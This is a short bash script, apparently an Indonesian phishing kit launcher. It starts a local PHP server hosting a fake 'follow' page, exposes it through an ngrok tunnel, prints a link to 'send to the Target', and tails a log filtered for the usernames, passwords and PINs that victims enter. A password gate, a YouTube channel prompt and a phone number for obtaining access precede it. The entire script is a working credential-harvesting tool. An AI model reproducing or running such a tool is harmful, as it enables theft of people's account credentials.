#!/bin/bash

php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
kill -9 $php
kill -9 $ngrok
clear
banner(){
curl -s http://artscene.textfiles.com/vt100/monkey.vt | pv -q -L 10000
echo -e "\e[1;33mSubscribe channel admin untuk mendapatkan akses"
sleep 2.8
xdg-open https://www.youtube.com/channel/UC1rlhLpR7f1ehlvx7IRgEvg
echo "minta pass ke 089646647191"
echo ""
pass="limit sukses :v"
until [ "$siapa" = "$pass" ]
do
	read -p "Masukan password tools ini : " siapa		
					
done

echo "MEMERIKSA KEAMANAN>>>"
sleep 2



clear

}

start(){
cd situs/
cd follow/
echo ""
echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING PHP SERVER // \e[0m'
php -S 127.0.0.1:4444 > /dev/null 2>&1 &
sleep 3
echo ""
echo -e $'\e[1;33m[\e[0m\e[1;77m+\e[0m\e[1;33m]\e[0m\e[1;32m // STARTING NGROK SERVER // \e[0m'
./ngrok http 4444 > /dev/null 2>&1 &
sleep 25
echo ""
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;33m[\e[0m <<>> \e[1;33m] Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" $link
echo ""
echo -e $'\e[1;33m\e[0m\e[1;33m // CREDENTIAL //  \e[0m'
echo ""
tail -f log.txt | grep -e "username" -e "password" -e "password" -e "pin" -e "Pin"                        
}
banner
start

